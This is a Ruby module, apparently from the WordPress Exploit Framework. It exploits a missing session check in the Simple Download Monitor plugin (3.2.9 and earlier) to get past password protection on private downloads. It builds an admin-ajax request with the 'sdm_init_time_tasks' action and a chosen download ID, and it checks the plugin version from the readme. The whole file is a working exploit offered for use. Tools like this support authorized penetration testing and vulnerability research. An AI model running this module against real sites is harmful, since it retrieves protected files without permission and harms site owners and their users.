# frozen_string_literal: true

class Wpxf::Auxiliary::SimpleDownloadMonitorFileDownload < Wpxf::Module
  include Wpxf::WordPress::FileDownload

  def initialize
    super

    update_info(
      name: 'Simple Download Monitor File Download',
      desc: %(
        This module uses a lack of session validation to bypass the
        password protection on private downloads.

        To gain a full list of downloads available, use the
        auxiliary/simple_download_monitor_file_disclosure module.
      ),
      author: [
        'James Golovich', # Disclosure
        'rastating'       # WPXF module
      ],
      references: [
        ['WPVDB', '8364'],
        ['URL', 'http://www.pritect.net/blog/simple-download-monitor-3-2-8-security-vulnerability']
      ],
      date: 'Jan 19 2016'
    )

    register_option(
      IntegerOption.new(
        name: 'post_id',
        desc: 'The post ID of the download',
        required: true
      )
    )
  end

  def check
    check_plugin_version_from_readme('simple-download-monitor', '3.2.9')
  end

  def register_remote_file_option?
    false
  end

  def post_id
    normalized_option_value('post_id')
  end

  def downloader_url
    wordpress_url_admin_ajax
  end

  def download_request_params
    {
      'action' => 'sdm_init_time_tasks',
      'smd_process_download' => '1',
      'download_id' => post_id.to_s
    }
  end

  def validate_content(content)
    if content.scrub.match?(/This download item \([0-9]+\) does not have any download link/i)
      emit_warning 'The file you requested appears to be invalid'
    end

    super
  end
end
